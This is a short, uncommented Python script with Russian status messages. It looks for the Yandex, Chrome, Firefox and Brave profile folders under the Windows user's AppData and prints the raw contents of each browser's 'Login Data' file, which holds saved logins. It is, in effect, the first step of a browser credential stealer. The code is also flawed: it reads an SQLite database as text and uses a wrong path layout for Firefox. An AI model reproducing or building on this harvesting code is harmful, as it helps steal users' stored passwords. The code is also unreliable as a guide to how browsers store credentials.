import os

browse ={
    "Yandex":"YandexBrowser",
    "Google":'Chrome',
    'Mozilla':'Firefox',
    "BraveSoftware":'Brave-Browser'

}
user_name = os.getlogin()

for key,valye in browse.items():
    way = fr'C:\Users\{user_name}\AppData\Local\{key}\{valye}\User Data\Default'
    if os.path.isdir(way):
        print(f"{key} найден")
        txt = open(way + '\\' + "Login Data")
        for i in txt:
            print(i)
    else:
        print(f"{key} не найден!")